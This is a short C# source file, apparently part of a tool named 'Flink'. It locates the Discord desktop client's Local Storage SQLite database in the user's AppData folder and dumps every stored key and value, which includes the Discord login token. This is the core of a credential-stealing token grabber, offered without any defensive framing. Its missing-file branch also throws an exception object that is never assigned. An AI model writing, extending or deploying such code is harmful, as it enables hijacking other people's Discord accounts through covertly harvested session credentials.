using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.IO;

namespace Flink
{
    public class InterpreterException : Exception
    {
        public string description { get; set; }
        public int timestamp { get; set; }
    }
    public class Interpreter
    {
        private string file_path;
        private InterpreterException exception;
        public Interpreter()
        {
            string path;

            path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            file_path = string.Format(@"{0}\discord\Local Storage\https_discordapp.com_0.localstorage", path);

            if(!File.Exists(file_path))
            {
                exception.description = "Discord files do not exist";

                throw exception;
            }
        }

        public Dictionary<string, string> Read()
        {
            string source;

            Dictionary<string, string> data = new Dictionary<string, string>();

            source = string.Format("Data Source={0}", file_path);

            using (SQLiteConnection sql = new SQLiteConnection(source))
            {
                try
                {
                    sql.Open();

                    using (SQLiteCommand cmd = sql.CreateCommand())
                    {
                        cmd.CommandText = "SELECT * FROM ItemTable";

                        using (SQLiteDataReader rd = cmd.ExecuteReader())
                        {
                            string key;
                            string value;

                            while (rd.Read())
                            {
                                key = rd.GetString(rd.GetOrdinal("key"));
                                value = rd.GetString(rd.GetOrdinal("value"));

                                //byte[] value = (byte[])rd["value"];

                                data.Add(key, value.Replace("\0", string.Empty));
                            }
                        }
                    }

                    return data;
                }
                catch(SQLiteException ex)
                {
                    throw ex;
                }
            }
        }
    }
}
